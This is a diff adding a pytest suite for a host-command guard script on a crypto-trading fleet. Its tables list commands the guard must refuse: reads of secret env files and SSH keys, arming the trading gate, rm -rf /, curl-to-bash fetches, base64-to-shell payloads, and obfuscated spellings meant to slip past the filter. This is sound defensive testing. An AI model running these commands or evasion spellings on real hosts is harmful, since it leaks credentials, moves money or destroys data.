@@ -1,0 +1,841 @@
+"""`infra/scripts/host-run.sh` and its judge `infra/scripts/host_run_sh.py`: the one door through which a session runs
+a block on a fleet host.
+
+Every case drives the real script, copied into a scratch checkout whose `ssh` is a fake first on PATH that records
+its argv and stdin and plays back a canned rc and stdout, or runs the remote command locally; no case reaches a host,
+and none writes the real checkout's `.local/host-commands.jsonl`."""
+
+from __future__ import annotations
+
+import base64
+import hashlib
+import importlib.util
+import json
+import os
+import pty
+import re
+import shutil
+import subprocess
+import sys
+import time
+from pathlib import Path
+
+import pytest
+
+REPO = Path(__file__).resolve().parents[1]
+SCRIPT = REPO / "infra" / "scripts" / "host-run.sh"
+JUDGE = REPO / "infra" / "scripts" / "host_run_sh.py"
+FLEET = REPO / "docs" / "reference" / "fleet.md"
+
+_spec = importlib.util.spec_from_file_location("host_run_sh", JUDGE)
+host_run_sh = importlib.util.module_from_spec(_spec)
+sys.modules["host_run_sh"] = host_run_sh
+_spec.loader.exec_module(host_run_sh)
+
+FAKE_SSH = """#!/usr/bin/env python3
+import json, os, subprocess, sys, time
+argv = sys.argv[1:]
+data = sys.stdin.read()
+with open(os.environ["FAKE_SSH_LOG"], "a") as f:
+    f.write(json.dumps({"argv": argv, "stdin": data, "pid": os.getpid()}) + "\\n")
+if os.environ.get("FAKE_SSH_EXEC") == "1":
+    sys.exit(subprocess.run(["bash", "-c", argv[-1]], stdin=subprocess.DEVNULL).returncode)
+sys.stdout.write(os.environ.get("FAKE_SSH_STDOUT", ""))
+sys.stdout.flush()
+time.sleep(float(os.environ.get("FAKE_SSH_SLEEP", "0")))
+sys.exit(int(os.environ.get("FAKE_SSH_RC", "0")))
+"""
+
+
+def _main_checkout() -> Path:
+    common = subprocess.run(
+        ["git", "-C", str(REPO), "rev-parse", "--path-format=absolute", "--git-common-dir"],
+        capture_output=True,
+        text=True,
+        check=True,
+    ).stdout.strip()
+    return Path(common).parent
+
+
+REAL_LOG = _main_checkout() / ".local" / "host-commands.jsonl"
+
+
+def _stat(path: Path):
+    return (path.stat().st_size, path.stat().st_mtime_ns) if path.exists() else None
+
+
+@pytest.fixture(autouse=True)
+def _the_real_log_is_never_written():
+    before = _stat(REAL_LOG)
+    yield
+    assert _stat(REAL_LOG) == before, f"a case wrote {REAL_LOG}: every run goes through a scratch checkout"
+
+
+class Door:
+    def __init__(self, root: Path):
+        self.root = root
+        self.main = root / "main"
+        self.bin = root / "bin"
+        self.ssh_log = root / "ssh.jsonl"
+        for d in (
+            self.main / "infra" / "scripts",
+            self.main / "docs" / "reference",
+            self.main / ".local",
+            self.bin,
+            root / "home",
+            root / "tmp",
+        ):
+            d.mkdir(parents=True, exist_ok=True)
+        shutil.copy(SCRIPT, self.main / "infra" / "scripts" / "host-run.sh")
+        shutil.copy(JUDGE, self.main / "infra" / "scripts" / "host_run_sh.py")
+        shutil.copy(FLEET, self.main / "docs" / "reference" / "fleet.md")
+        (self.main / ".gitignore").write_text(".local/\n")
+        (self.bin / "ssh").write_text(FAKE_SSH)
+        (self.bin / "ssh").chmod(0o755)
+        git = lambda *a: subprocess.run(["git", "-C", str(self.main), *a], check=True, capture_output=True)  # noqa: E731
+        git("init", "-q", "-b", "develop")
+        git("config", "user.email", "door@test")
+        git("config", "user.name", "door")
+        git("add", ".")
+        git("commit", "-qm", "door")
+        self.script = self.main / "infra" / "scripts" / "host-run.sh"
+        self.log = self.main / ".local" / "host-commands.jsonl"
+
+    def env(self, **extra: str) -> dict[str, str]:
+        env = {k: v for k, v in os.environ.items() if not k.startswith(("FAKE_SSH_", "ZCRYPTO_SESSION"))}
+        env.update(
+            PATH=f"{self.bin}{os.pathsep}{os.environ['PATH']}",
+            FAKE_SSH_LOG=str(self.ssh_log),
+            HOME=str(self.root / "home"),
+            TMPDIR=str(self.root / "tmp"),
+            ZCRYPTO_SESSION="door-test",
+        )
+        env.update(extra)
+        return env
+
+    def run(
+        self, alias: str, block: str | bytes, *args: str, script: Path | None = None, unset: tuple = (), **extra: str
+    ) -> subprocess.CompletedProcess:
+        env = self.env(**extra)
+        for k in unset:
+            env.pop(k, None)
+        data = block.encode() if isinstance(block, str) else block
+        return subprocess.run(
+            ["bash", str(script or self.script), *args, alias], input=data, capture_output=True, env=env, timeout=60
+        )
+
+    def judge(self, alias: str, block: str) -> subprocess.CompletedProcess:
+        return self.run(alias, block, "--judge")
+
+    def ssh_calls(self) -> list[dict]:
+        return [json.loads(line) for line in self.ssh_log.read_text().splitlines()] if self.ssh_log.exists() else []
+
+    def lines(self) -> list[dict]:
+        return [json.loads(line) for line in self.log.read_text().splitlines()] if self.log.exists() else []
+
+
+@pytest.fixture(scope="module")
+def door(tmp_path_factory) -> Door:
+    return Door(tmp_path_factory.mktemp("door"))
+
+
+@pytest.fixture
+def fresh(tmp_path) -> Door:
+    return Door(tmp_path)
+
+
+def _rule(done: subprocess.CompletedProcess) -> str | None:
+    m = re.search(r"^host-run: REFUSED \(([a-z-]+)\) — .+; .+$", done.stderr.decode(), re.M)
+    return m.group(1) if m else None
+
+
+# ---------------------------------------------------------------- refusals, one table per rule
+
+REFUSED = [
+    # secrets: a container's environment
+    ("secrets", "docker-inspect-unscoped", "zcrypto", "sudo docker inspect zcrypto-engine"),
+    ("secrets", "docker-container-inspect-unscoped", "zcrypto", "sudo docker container inspect zcrypto-engine"),
+    ("secrets", "docker-inspect-config-env", "zcrypto", "sudo docker inspect --format '{{json .Config.Env}}' zcrypto-engine"),
+    ("secrets", "docker-inspect-config-json", "zcrypto", "sudo docker inspect -f '{{json .Config}}' zcrypto-engine"),
+    ("secrets", "docker-inspect-config", "zcrypto", "sudo docker inspect --format='{{.Config}}' zcrypto-engine"),
+    ("secrets", "docker-inspect-whole-object", "zcrypto", "sudo docker inspect --format '{{json .}}' zcrypto-engine"),
+    (
+        "secrets",
+        "docker-inspect-range-env",
+        "zcrypto",
+        "sudo docker inspect --format '{{range .Config.Env}}{{println .}}{{end}}' zcrypto-engine",
+    ),
+    ("secrets", "docker-inspect-format-json", "zcrypto", "sudo docker inspect --format json zcrypto-engine"),
+    ("secrets", "docker-exec-env", "zcrypto", "sudo docker exec zcrypto-engine env"),
+    ("secrets", "docker-exec-printenv", "zcrypto", "sudo docker exec zcrypto-engine printenv KRAKEN_API_KEY"),
+    ("secrets", "docker-exec-set", "zcrypto", "sudo docker exec zcrypto-engine sh -c set"),
+    ("secrets", "docker-exec-export-p", "zcrypto", "sudo docker exec zcrypto-engine sh -c 'export -p'"),
+    ("secrets", "docker-exec-proc-environ", "zcrypto", "sudo docker exec zcrypto-engine cat /proc/1/environ"),
+    ("secrets", "host-proc-environ", "zcrypto", "sudo cat /proc/$(pidof zcrypto)/environ"),
+    ("secrets", "proc-environ-redirect", "zcrypto", "sudo tr '\\0' '\\n' < /proc/1/environ"),
+    ("secrets", "docker-exec-echo-container-var", "zcrypto", "sudo docker exec zcrypto-engine sh -c 'echo $KRAKEN_API_SECRET'"),
+    (
+        "secrets",
+        "docker-exec-python-environ",
+        "zcrypto",
+        "sudo docker exec zcrypto-engine python -c 'import os; print(os.environ)'",
+    ),
+    (
+        "secrets",
+        "docker-run-env-file-env",
+        "zcrypto",
+        "sudo docker run --rm --env-file /opt/zcrypto-engine/engine.env ghcr.io/x/y env",
+    ),
+    ("secrets", "docker-compose-config", "zcrypto", "sudo docker compose -f /opt/zcrypto-engine/compose.yaml config"),
+    ("secrets", "docker-compose-config-cwd", "zcrypto", "cd /opt/zcrypto-engine && sudo docker compose config"),
+    ("secrets", "docker-compose-v1-config", "zcrypto", "sudo docker-compose -f /opt/zcrypto-engine/compose.yaml config"),
+    ("secrets", "systemctl-show-environment-property", "zcrypto", "sudo systemctl show zcrypto-engine -p Environment"),
+    ("secrets", "systemctl-show-every-property", "zcrypto", "sudo systemctl show zcrypto-engine"),
+    (
+        "secrets",
+        "systemctl-show-long-property",
+        "hp",
+        "sudo systemctl show --property=Environment zcrypto-grafana-watchdog.service",
+    ),
+    ("secrets", "systemctl-show-environment", "zcrypto", "sudo systemctl show-environment"),
+    ("secrets", "systemctl-cat-env-file-unit", "hp", "sudo systemctl cat zcrypto-grafana-watchdog.service"),
+    ("secrets", "systemctl-cat-alloy", "mon", "sudo systemctl cat alloy"),
+    ("secrets", "systemctl-cat-selfcheck", "hc", "sudo systemctl cat zcrypto-hc-selfcheck"),
+    # secrets: a credential file read, copied, archived, diffed or grepped
+    ("secrets", "cat-engine-env", "zcrypto", "sudo cat /opt/zcrypto-engine/engine.env"),
+    ("secrets", "less-engine-env", "zcrypto", "sudo less /opt/zcrypto-engine/engine.env"),
+    ("secrets", "head-engine-env", "zcrypto", "sudo head -n 3 /opt/zcrypto-engine/engine.env"),
+    ("secrets", "tail-logship-env", "zcrypto", "sudo tail -1 /opt/zcrypto-capture/logship-secrets.env"),
+    ("secrets", "grep-engine-env", "zcrypto", "sudo grep KRAKEN /opt/zcrypto-engine/engine.env"),
+    ("secrets", "awk-alloy-secrets", "red", "sudo awk -F= '{print $1}' /etc/zcrypto-capture/alloy/alloy-secrets.env"),
+    ("secrets", "sed-n-logship-env", "zcrypto", "sudo sed -n 1p /opt/zcrypto-capture/logship-secrets.env"),
+    ("secrets", "cp-engine-env", "zcrypto", "sudo cp /opt/zcrypto-engine/engine.env /tmp/x"),
+    ("secrets", "scp-engine-env", "zcrypto", "scp /opt/zcrypto-engine/engine.env /tmp/"),
+    ("secrets", "tar-engine-dir", "zcrypto", "sudo tar czf - /opt/zcrypto-engine | base64"),
+    ("secrets", "base64-wireguard", "zcrypto", "sudo base64 /etc/wireguard/zcache0.conf"),
+    ("secrets", "xxd-deploy-key", "zcrypto", "sudo xxd /home/zcrypto-deploy/.ssh/id_ed25519"),
+    ("secrets", "strings-root-key", "zcrypto", "sudo strings /root/.ssh/id_rsa"),
+    ("secrets", "dd-host-key", "zcrypto", "sudo dd if=/etc/ssh/ssh_host_ed25519_key bs=1"),
+    ("secrets", "named-ed25519-key", "nas", "cat /volume1/keys/deploy_nas_ed25519"),
+    ("secrets", "netrc", "zcrypto", "cat ~/.netrc"),
+    ("secrets", "vault-yml", "zcrypto", "cat /srv/x/vault.yml"),
+    ("secrets", "vault-file", "zcrypto", "cat /srv/x/secrets.vault"),
+    ("secrets", "pem-key", "access", "sudo less /var/lib/caddy/certificates/x/site.pem"),
+    ("secrets", "wireguard-config", "zcrypto", "sudo cat /etc/wireguard/zcache0.conf"),
+    ("secrets", "diff-engine-env", "zcrypto", "sudo diff /opt/zcrypto-engine/engine.env /tmp/engine.env.bak"),
+    ("secrets", "recursive-grep-over-secrets", "zcrypto", "sudo grep -r PASSWORD /opt"),
+    ("secrets", "docker-container-config", "zcrypto", "sudo cat /var/lib/docker/containers/abc/config.v2.json"),
+    ("secrets", "apt-alloy-env", "mon", "sudo cat /etc/default/alloy"),
+    ("secrets", "dead-man-backup", "nas", "sudo cat /volume1/docker/zcrypto-archive/hc-backups/hc-20261125T0247Z.sqlite"),
+    ("secrets", "secret-fed-to-stdin", "zcrypto", "sudo python3 - < /opt/zcrypto-engine/engine.env"),
+    ("secrets", "python-reads-env-file", "zcrypto", "sudo python3 -c \"print(open('/opt/zcrypto-engine/engine.env').read())\""),
+    ("secrets", "wg-showconf", "zcrypto", "sudo wg showconf zcache0"),
+    ("secrets", "wg-private-key", "access", "sudo wg show zaccess0 private-key"),
+    ("secrets", "kraken-on-a-host", "zcrypto", "kraken balance"),
+    ("secrets", "kraken-install-on-a-host", "zcrypto", "cargo install kraken" + "-cli"),
+    # the money path: acts that open the gate or move orders
+    ("money-path", "touch-armed", "zcrypto", "sudo touch /var/lib/zcrypto-engine/exec/armed"),
+    ("money-path", "redirect-armed", "zcrypto", "sudo sh -c 'echo > /var/lib/zcrypto-engine/exec/armed'"),
+    ("money-path", "tee-armed", "zcrypto", "echo 1 | sudo tee /var/lib/zcrypto-engine/exec/armed"),
+    ("money-path", "cp-armed", "zcrypto", "sudo cp /tmp/x /var/lib/zcrypto-engine/exec/armed"),
+    ("money-path", "cp-into-exec-dir", "zcrypto", "sudo cp /tmp/armed /var/lib/zcrypto-engine/exec/"),
+    ("money-path", "mv-armed", "zcrypto", "sudo mv /tmp/x /var/lib/zcrypto-engine/exec/armed"),
+    ("money-path", "install-armed", "zcrypto", "sudo install -m 0640 /dev/null /var/lib/zcrypto-engine/exec/armed"),
+    ("money-path", "ln-armed", "zcrypto", "sudo ln -s /tmp/x /var/lib/zcrypto-engine/exec/armed"),
+    ("money-path", "python-open-armed", "zcrypto", "sudo python3 -c \"open('/var/lib/zcrypto-engine/exec/armed','w').close()\""),
+    ("money-path", "truncate-armed", "zcrypto", "sudo truncate -s 0 /var/lib/zcrypto-engine/exec/armed"),
+    ("money-path", "rm-restart-hold", "zcrypto", "sudo rm /var/lib/zcrypto-engine/exec/restart-hold"),
+    ("money-path", "mv-restart-hold-away", "zcrypto", "sudo mv /var/lib/zcrypto-engine/exec/restart-hold /tmp/"),
+    ("money-path", "rm-kill", "zcrypto", "sudo rm /var/lib/zcrypto-engine/exec/kill"),
+    ("money-path", "rename-kill", "zcrypto", "sudo mv /var/lib/zcrypto-engine/exec/kill /var/lib/zcrypto-engine/exec/kill.old"),
+    ("money-path", "unlink-kill", "zcrypto", "sudo unlink /var/lib/zcrypto-engine/exec/kill"),
+    ("money-path", "find-delete-kill", "zcrypto", "sudo find /var/lib/zcrypto-engine/exec -name kill -delete"),
+    ("money-path", "rm-exec-dir", "zcrypto", "sudo rm -r /var/lib/zcrypto-engine/exec"),
+    (
+        "money-path",
+        "plan-placement-mv",
+        "zcrypto",
+        "sudo mv /var/lib/zcrypto-engine/exec/probe-plan.staging.json /var/lib/zcrypto-engine/exec/probe-plan.json",
+    ),
+    ("money-path", "plan-placement-cp", "zcrypto", "sudo cp /tmp/plan.json /var/lib/zcrypto-engine/exec/probe-plan.json"),
+    ("money-path", "plan-placement-tee", "zcrypto", "sudo tee /var/lib/zcrypto-engine/exec/probe-plan.json < /tmp/plan.json"),
+    ("money-path", "flatten-execute", "zcrypto", "sudo zcrypto-flatten --execute"),
+    ("money-path", "flatten-execute-docker-exec", "zcrypto", "sudo docker exec zcrypto-engine zcrypto engine flatten --execute"),
+    (
+        "money-path",
+        "flatten-execute-docker-run",
+        "zcrypto",
+        "sudo docker run --rm --network host ghcr.io/x/y zcrypto engine flatten --execute",
+    ),
+    (
+        "money-path",
+        "order-semantics-apply",
+        "zcrypto",
+        "uv run python infra/scripts/kraken-order-semantics-probe.py --probes 1,2,3,4 --apply",
+    ),
+    # terminal tools
+    ("terminal", "converge", "zcrypto", "infra/ansible/scripts/converge.sh site.yml --limit zcrypto-red --tags capture"),
+    ("terminal", "ansible-playbook", "zcrypto", "ansible-playbook site.yml"),
+    ("terminal", "ansible-vault", "zcrypto", "ansible-vault view x"),
+    ("terminal", "docker-exec-it", "zcrypto", "sudo docker exec -it zcrypto-engine sh"),
+    ("terminal", "docker-exec-i", "zcrypto", "sudo docker exec -i zcrypto-engine python - < /tmp/x.py"),
+    ("terminal", "docker-exec-tty", "zcrypto", "sudo docker exec --tty zcrypto-engine ls"),
+    ("terminal", "docker-run-t", "zcrypto", "sudo docker run --rm -t ghcr.io/x/y ls"),
+    (
+        "terminal",
+        "docker-run-ti-env-file",
+        "zcrypto",
+        "sudo docker run --rm -ti --env-file /opt/zcrypto-engine/engine.env ghcr.io/x/y zcrypto engine flatten",
+    ),
+    ("terminal", "sudo-S", "zcrypto", "sudo -S true"),
+    ("terminal", "vi", "zcrypto", "sudo vi /etc/hosts"),
+    ("terminal", "vim", "zcrypto", "vim /tmp/x"),
+    ("terminal", "nano", "zcrypto", "sudo nano /etc/hosts"),
+    ("terminal", "emacs", "zcrypto", "emacs /tmp/x"),
+    ("terminal", "ssh-add", "zcrypto", "ssh-add -l"),
+    ("terminal", "passwd", "zcrypto", "sudo passwd zcrypto-deploy"),
+    ("terminal", "visudo", "zcrypto", "sudo visudo"),
+    ("terminal", "ssh-onward", "zcrypto", "ssh red uptime"),
+    ("terminal", "su-dash", "zcrypto", "su -"),
+    ("terminal", "sudo-i-bare", "zcrypto", "sudo -i"),
+    ("terminal", "flatten-plan-needs-a-tty", "zcrypto", "sudo zcrypto-flatten"),
+    ("terminal", "systemctl-edit", "zcrypto", "sudo systemctl edit zcrypto-engine"),
+    # capture on the primary
+    ("capture-primary", "systemctl-stop-capture", "zcrypto", "sudo systemctl stop zcrypto-capture"),
+    ("capture-primary", "systemctl-restart-capture", "zcrypto", "sudo systemctl restart zcrypto-capture"),
+    ("capture-primary", "systemctl-kill-capture", "zcrypto", "sudo systemctl kill zcrypto-capture.service"),
+    ("capture-primary", "systemctl-disable-capture", "zcrypto", "sudo systemctl disable --now zcrypto-capture"),
+    ("capture-primary", "systemctl-mask-capture", "zcrypto", "sudo systemctl mask zcrypto-capture"),
+    ("capture-primary", "docker-stop-capture", "zcrypto", "sudo docker stop zcrypto-capture"),
+    ("capture-primary", "docker-restart-alloy", "zcrypto", "sudo docker restart grafana-alloy"),
+    ("capture-primary", "docker-kill-capture", "zcrypto", "sudo docker kill zcrypto-capture"),
+    ("capture-primary", "docker-rm-alloy", "zcrypto", "sudo docker rm -f grafana-alloy"),
+    ("capture-primary", "compose-down-alloy", "zcrypto", "sudo docker compose -f /etc/zcrypto-capture/alloy/compose.yaml down"),
+    ("capture-primary", "systemctl-stop-docker", "zcrypto", "sudo systemctl stop docker"),
+    ("capture-primary", "pkill-alloy", "zcrypto", "sudo pkill -f alloy"),
+    ("capture-primary", "image-prune-primary", "zcrypto", "sudo docker image prune -af"),
+    ("capture-primary", "system-prune-primary", "zcrypto", "sudo docker system prune -f"),
+    ("capture-primary", "image-prune-secondary", "red", "sudo docker image prune -af"),
+    ("capture-primary", "system-prune-secondary", "red", "sudo docker system prune -f"),
+    # this workstation
+    ("workstation", "reboot", "hp", "sudo reboot"),
+    ("workstation", "shutdown", "hp", "sudo shutdown -r now"),
+    ("workstation", "poweroff", "hp", "sudo poweroff"),
+    ("workstation", "halt", "hp", "sudo halt"),
+    ("workstation", "systemctl-reboot", "hp", "sudo systemctl reboot"),
+    ("workstation", "systemctl-poweroff", "hp", "sudo systemctl poweroff"),
+    ("workstation", "systemctl-halt", "hp", "sudo systemctl halt"),
+    ("workstation", "systemctl-kexec", "hp", "sudo systemctl kexec"),
+    ("workstation", "systemctl-isolate", "hp", "sudo systemctl isolate rescue.target"),
+    # hazards
+    ("hazards", "apt-upgrade", "zcrypto", "sudo apt upgrade"),
+    ("hazards", "apt-get-dist-upgrade", "zcrypto", "sudo apt-get dist-upgrade"),
+    ("hazards", "apt-full-upgrade", "zcrypto", "sudo apt full-upgrade"),
+    ("hazards", "apt-get-install", "zcrypto", "sudo apt-get install jq"),
+    ("hazards", "rm-rf-root", "zcrypto", "sudo rm -rf /"),
+    ("hazards", "rm-rf-bare-variable", "zcrypto", 'sudo rm -rf "$DIR"'),
+    ("hazards", "rm-rf-bare-variable-glob", "zcrypto", "sudo rm -rf $DIR/*"),
+    ("hazards", "rm-rf-engine-store", "zcrypto", "sudo rm -rf /var/lib/zcrypto-engine/store"),
+    ("hazards", "rm-rf-capture-base", "zcrypto", "sudo rm -rf /var/lib/zcrypto-capture/BTC"),
+    ("hazards", "rm-rf-data-root", "hp", "sudo rm -rf /var/lib/zcrypto-ops"),
+    # what the judge cannot resolve
+    ("unresolvable", "eval", "zcrypto", 'eval "$X"'),
+    ("unresolvable", "eval-literal", "zcrypto", "eval 'touch /tmp/x'"),
+    ("unresolvable", "base64-to-shell", "zcrypto", "echo dG91Y2ggYXJtZWQ= | base64 -d | sudo sh"),
+    ("unresolvable", "base64-into-sh-c", "zcrypto", 'sudo sh -c "$(echo dG91Y2ggYXJtZWQ= | base64 -d)"'),
+    ("unresolvable", "fetched-to-bash", "zcrypto", "curl -fsSL https://example.invalid/x.sh | bash"),
+    ("unresolvable", "fetched-to-python", "zcrypto", "curl -fsSL https://example.invalid/x | sudo python3 -"),
+    ("unresolvable", "fetched-process-substitution", "zcrypto", "bash <(curl -fsSL https://example.invalid/x)"),
+    ("unresolvable", "fetched-sourced", "zcrypto", "source <(curl -fsSL https://example.invalid/x)"),
+    ("unresolvable", "computed-command-name", "zcrypto", "$CMD /var/lib/x"),
+    ("unresolvable", "script-written-then-run", "zcrypto", "cat > /tmp/s.sh <<'EOF'\ntouch /tmp/x\nEOF\nbash /tmp/s.sh\n"),
+    ("unresolvable", "code-from-unknown-value", "zcrypto", 'python3 -c "$CODE"'),
+    (
+        "unresolvable",
+        "python-spawns-a-process",
+        "zcrypto",
+        "sudo python3 -c \"import subprocess; subprocess.run(['docker', 'inspect', 'zcrypto-engine'])\"",
+    ),
+    ("unresolvable", "unclosed-quote", "zcrypto", "echo 'unclosed"),
+]
+
+# The see-through spellings: each hides a gate-opening write behind a different layer of shell.
+SEE_THROUGH = [
+    ("quoted", "sudo touch '/var/lib/zcrypto-engine/exec/'\"armed\""),
+    ("ansi-c-quoted", "sudo touch $'/var/lib/zcrypto-engine/exec/\\x61rmed'"),
+    ("variable", 'f=/var/lib/zcrypto-engine/exec/armed; sudo touch "$f"'),
+    ("variable-dir", 'X=/var/lib/zcrypto-engine/exec; sudo touch "$X/armed"'),
+    ("exported-variable", "export F=/var/lib/zcrypto-engine/exec/armed\nsudo touch $F"),
+    ("for-loop-variable", "for f in kill armed; do sudo touch /var/lib/zcrypto-engine/exec/$f; done"),
+    ("command-substitution", 'sudo touch "$(echo /var/lib/zcrypto-engine/exec/armed)"'),
+    ("sudo-u", "sudo -u zcrypto-engine touch /var/lib/zcrypto-engine/exec/armed"),
+    ("env-nohup", "env X=1 nohup touch /var/lib/zcrypto-engine/exec/armed"),
+    ("bash-c", "sudo bash -c 'touch /var/lib/zcrypto-engine/exec/armed'"),
+    ("bash-c-split-word", 'sudo bash -c "touch /var/lib/zcrypto-engine/exec/arm""ed"'),
+    ("sh-c-cd", "sudo sh -c 'cd /var/lib/zcrypto-engine/exec && touch armed'"),
+    ("xargs", "echo /var/lib/zcrypto-engine/exec/armed | xargs sudo touch"),
+    ("pipe", "ls | sudo tee /var/lib/zcrypto-engine/exec/armed"),
+    ("and-chain", "true && sudo touch /var/lib/zcrypto-engine/exec/armed"),
+    ("semicolon-chain", "date; sudo touch /var/lib/zcrypto-engine/exec/armed; date"),
+    ("heredoc-to-shell", "sudo bash <<'EOF'\ncd /var/lib/zcrypto-engine/exec\ntouch armed\nEOF\n"),
+    ("brace-expansion", "sudo touch /var/lib/zcrypto-engine/exec/{armed,x}"),
+    ("subshell-cd", "(cd /var/lib/zcrypto-engine/exec && sudo touch armed)"),
+    ("if-body", "if true; then\n  sudo touch /var/lib/zcrypto-engine/exec/armed\nfi\n"),
+    ("find-exec", "sudo find /tmp -name plan.json -exec cp {} /var/lib/zcrypto-engine/exec/probe-plan.json \\;"),
+    ("timeout-wrapper", "sudo timeout 5 touch /var/lib/zcrypto-engine/exec/armed"),
+    ("systemd-run", "sudo systemd-run --wait touch /var/lib/zcrypto-engine/exec/armed"),
+]
+
+# Allowed forms: gate-closing acts, reads of the gate files, and runbook rows of class R and S.
+ADMITTED = [
+    ("rm-armed-pause", "zcrypto", "sudo rm /var/lib/zcrypto-engine/exec/armed"),
+    ("touch-kill", "zcrypto", "sudo touch /var/lib/zcrypto-engine/exec/kill"),
+    ("touch-restart-hold", "zcrypto", "sudo touch /var/lib/zcrypto-engine/exec/restart-hold"),
+    ("systemctl-stop-engine", "zcrypto", "sudo systemctl stop zcrypto-engine"),
+    ("ls-gate-files", "zcrypto", "sudo ls -la /var/lib/zcrypto-engine/exec/"),
+    (
+        "test-e-gate-files",
+        "zcrypto",
+        "test -e /var/lib/zcrypto-engine/exec/armed && echo armed; sudo test -e /var/lib/zcrypto-engine/exec/kill",
+    ),
+    ("stat-gate-files", "zcrypto", "sudo stat -c %y /var/lib/zcrypto-engine/exec/restart-hold /var/lib/zcrypto-engine/exec/kill"),
+    ("cat-kill-reason", "zcrypto", "sudo cat /var/lib/zcrypto-engine/exec/kill"),
+    ("kill-if-absent", "zcrypto", "[ -e /var/lib/zcrypto-engine/exec/kill ] || sudo touch /var/lib/zcrypto-engine/exec/kill"),
+    ("rm-plan-debris", "zcrypto", "sudo rm /var/lib/zcrypto-engine/exec/armed /var/lib/zcrypto-engine/exec/probe-plan.json"),
+    (
+        "stage-a-plan",
+        "zcrypto",
+        "sudo install -o zcrypto-engine -g zcrypto-engine -m 0640 /tmp/probe-plan.json "
+        "/var/lib/zcrypto-engine/exec/probe-plan.staging.json",
+    ),
+    (
+        "check-a-staged-plan",
+        "zcrypto",
+        "sudo docker exec zcrypto-engine zcrypto engine probe-plan /var/lib/zcrypto-engine/exec/probe-plan.staging.json --check",
+    ),
+    ("inspect-started-at", "zcrypto", "sudo docker inspect --format '{{.State.StartedAt}}' zcrypto-engine"),
+    ("inspect-image", "zcrypto", "sudo docker inspect --format '{{.Config.Image}}' zcrypto-cache-proxy"),
+    ("inspect-format-after-name", "zcrypto", "docker inspect zcrypto-engine --format '{{.State.StartedAt}}'"),
+    (
+        "inspect-three-fields",
+        "zcrypto",
+        "sudo docker inspect --format '{{.State.Status}} started={{.State.StartedAt}} restarts={{.RestartCount}}' zcrypto-engine",
+    ),
+    ("exec-status", "zcrypto", "sudo docker exec zcrypto-engine zcrypto engine exec-status"),
+    (
+        "engine-cycle-replace",
+        "zcrypto",
+        "sudo docker exec zcrypto-engine zcrypto engine cycle --at 2026-11-25T12:00:00+00:00 --replace",
+    ),
+    (
+        "nautilus-version-in-engine",
+        "zcrypto",
+        'sudo docker exec zcrypto-engine python -c "import nautilus_trader; print(nautilus_trader.__version__)"',
+    ),
+    (
+        "nautilus-version-in-image",
+        "zcrypto",
+        "sudo docker run --rm --entrypoint python ghcr.io/zhaow-de/zcrypto-capture@sha256:0123456789ab "
+        '-c "import nautilus_trader; print(nautilus_trader.__version__)"',
+    ),
+    (
+        "ledger-read-heredoc",
+        "zcrypto",
+        "sudo python3 - <<'PY'\nimport json, pathlib\nroot = pathlib.Path(\"/var/lib/zcrypto-engine/journal\")\n"
+        'for p in sorted(root.glob("*/exec-*.json")):\n    d = json.loads(p.read_text())\n'
+        '    print(p, "level=", d["level"], "kraken", d.get("submitted"))\nPY\n',
+    ),
+    (
+        "journal-accum-by-date",
+        "zcrypto",
+        "sudo cat /var/lib/zcrypto-engine/journal/$(date -u +%F)/accum-$(printf %02d $(( $(date -u +%-H) / 4 * 4 ))).json",
+    ),
+    (
+        "journal-loop-glob",
+        "zcrypto",
+        "for f in /var/lib/zcrypto-engine/journal/2026-11-25/exec-*.json; do "
+        'python3 -c "import json,sys;print(json.load(open(sys.argv[1]))[\'level\'])" "$f"; done | sort | uniq -c',
+    ),
+    (
+        "journal-loop-ls",
+        "zcrypto",
+        "for f in $(ls /var/lib/zcrypto-engine/journal/*/accum-*.json | tail -2); do "
+        'python3 -c "import json,sys; d=json.load(open(sys.argv[1])); print(d[\'status\'])" "$f"; done',
+    ),
+    ("failed-cycle-sh-c", "zcrypto", "sudo sh -c 'cat /var/lib/zcrypto-engine/journal/$(date -u +%F)/failed-cycle-*.json'"),
+    ("grep-flatten-wrapper", "zcrypto", "sudo grep -E '^(STATE_DIR|IMAGE|OWNER)=' /usr/local/sbin/zcrypto-flatten"),
+    (
+        "series-start-rewrite",
+        "zcrypto",
+        "printf '%s\\n' '2026-11-23T00:00:00Z' > /tmp/series-start && sudo install -o zcrypto-engine -g zcrypto-engine "
+        "-m 0640 /tmp/series-start /var/lib/zcrypto-engine/exec/series-start.next && sudo mv "
+        "/var/lib/zcrypto-engine/exec/series-start.next /var/lib/zcrypto-engine/exec/series-start && rm /tmp/series-start",
+    ),
+    (
+        "store-aside",
+        "zcrypto",
+        "sudo mv /var/lib/zcrypto-engine/store /var/lib/zcrypto-engine/store.aside-$(date -u +%Y%m%dT%H%MZ)",
+    ),
+    ("store-aside-removed", "zcrypto", "sudo rm -r /var/lib/zcrypto-engine/store.aside-20261125T1200Z"),
+    ("compose-proxy-up", "zcrypto", "sudo docker compose -f /opt/zcrypto-engine/compose.yaml up -d cache-proxy"),
+    ("compose-engine-down", "zcrypto", "sudo docker compose -f /opt/zcrypto-engine/compose.yaml down"),
+    ("engine-restart", "zcrypto", "sudo systemctl restart zcrypto-engine && sudo systemctl status zcrypto-engine --no-pager"),
+    (
+        "engine-logs-grep",
+        "zcrypto",
+        "sudo docker logs --since 30m zcrypto-engine 2>&1 | grep -E 'cache restore|Received [0-9]|Reconciliation complete|CRITICAL'",
+    ),
+    ("engine-network-drill", "zcrypto", "sudo docker network disconnect zcrypto-engine_default zcrypto-engine"),
+    (
+        "journal-tar-to-stdout",
+        "zcrypto",
+        "sudo tar -C /var/lib/zcrypto-engine/journal/2026-11-25 -cf - cycle-12.json venue-12.json",
+    ),
+    ("journalctl-since", "zcrypto", "sudo journalctl -u zcrypto-engine --since -2h | grep -i reconnect"),
+    ("primary-reboot", "zcrypto", "sudo systemctl reboot"),
+    ("capture-prune-timer", "zcrypto", "sudo systemctl restart zcrypto-capture-prune.timer"),
+    ("engine-restart-in-container", "zcrypto", "sudo docker restart zcrypto-engine"),
+    ("secondary-capture-stop", "red", "sudo systemctl stop zcrypto-capture"),
+    ("secondary-alloy-stop", "red", "sudo docker stop grafana-alloy"),
+    ("secondary-alloy-restart", "red", "sudo docker restart grafana-alloy"),
+    (
+        "secondary-restore-timer",
+        "red",
+        "sudo systemd-run --on-active=26min --unit=zcrypto-capture-restore systemctl start zcrypto-capture",
+    ),
+    ("secondary-reboot", "red", "sudo reboot"),
+    ("ops-image-prune", "hp", "sudo docker image prune -af"),
+    (
+        "ops-liquidations-poll",
+        "hp",
